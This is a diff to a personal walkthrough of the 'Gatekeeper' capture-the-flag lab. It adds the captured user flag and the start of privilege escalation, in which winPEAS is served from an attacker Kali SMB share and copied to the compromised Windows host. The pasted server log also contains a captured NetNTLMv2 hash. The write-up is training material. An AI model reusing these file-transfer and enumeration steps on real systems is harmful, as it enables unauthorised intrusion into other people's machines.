@@ -538,6 +538,18 @@ dir
                2 Dir(s)  15,879,462,912 bytes free
 ```
 
+```
+C:\Users\natbat\Desktop>type user.txt.txt
+type user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his 
+"dostackbufferoverflowgood" program.  Thank you!
+
+```
+
+
+
 also the bat file that I want to view. 
 
 ```
@@ -588,3 +600,66 @@ SMB         10.10.236.87    445    GATEKEEPER       [+] gatekeeper\metasploit:Me
 This does not work, so I am going to need to find a different path to priv esc.
 
 # priv esc
+
+First let me send over winpeas
+
+
+wget on linux to send over wtih 
+
+`wget https://github.com/carlospolop/PEASS-ng/releases/download/20220821/winPEASx86.exe`
+
+
+I then use impackest smb server on kali and the copy command to get it on windows
+
+kali
+```
+└─$ /usr/share/doc/python3-impacket/examples/smbserver.py kali .                                                    
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                            
+                                                                                                                    
+[*] Config file parsed                                                                                              
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                              
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                              
+[*] Config file parsed                                                                                              
+[*] Config file parsed                                                                                              
+[*] Config file parsed                                                                                              
+[*] Incoming connection (10.10.58.134,49203)                                                                        
+[*] AUTHENTICATE_MESSAGE (GATEKEEPER\natbat,GATEKEEPER)                                                             
+[*] User GATEKEEPER\natbat authenticated successfully                                                               
+[*] natbat::GATEKEEPER:aaaaaaaaaaaaaaaa:33e7bd5634e51080996a6856de32e8ee:01010000000000000004dabca7b5d801d9d0181cfac
+3dd2000000000010010004600440065004300530045006f004b00030010004600440065004300530045006f004b00020010006c0071005500510
+04e004b0065004900040010006c007100550051004e004b0065004900070008000004dabca7b5d80106000400020000000800300030000000000
+0000000000000002000007e9045fca604931b264ccb5d2d348c5dc70b1152fc6a6b04879c1282e07b9c350a00100000000000000000000000000
+00000000009001e0063006900660073002f00310030002e0036002e00370037002e0033003800000000000000000000000000               
+[-] Unknown level for query path info! 0x109                                                                        
+[*] Disconnecting Share(1:IPC$)    
+```
+
+Then to copy with windows
+
+
+```
+C:\Users\Share>copy \\10.6.77.38\kali\peas.exe c:\users\Share\peas.exe
+copy \\10.6.77.38\kali\peas.exe c:\users\Share\peas.exe
+        1 file(s) copied.
+
+C:\Users\Share>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\Share
+
+08/21/2022  05:48 PM    <DIR>          .
+08/21/2022  05:48 PM    <DIR>          ..
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+08/21/2022  12:35 AM         1,965,056 peas.exe
+               2 File(s)      1,978,368 bytes
+               2 Dir(s)  15,750,787,072 bytes free
+
+C:\Users\Share>peas.exe > pea.log
+peas.exe > pea.log
+```
+
+
+I do this so that even if my shell dies, I can get the pea.log via the smb share (also I have write access there...so)
+
